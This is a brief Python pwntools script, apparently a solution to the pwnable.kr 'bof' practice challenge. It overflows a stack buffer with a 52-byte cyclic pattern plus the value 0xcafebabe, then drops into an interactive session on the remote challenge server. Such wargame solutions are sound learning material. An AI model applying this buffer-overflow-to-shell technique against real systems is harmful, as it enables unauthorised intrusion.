from pwn import *

print "PWN!!!!"
#context.binary = './bof'
context.update(arch="i386")

#r = process("./bof")
r = remote("pwnable.kr",9000)
pause()
payload = p32(0xcafebabe)
r.sendline(cyclic(4*13) + payload)

r.interactive()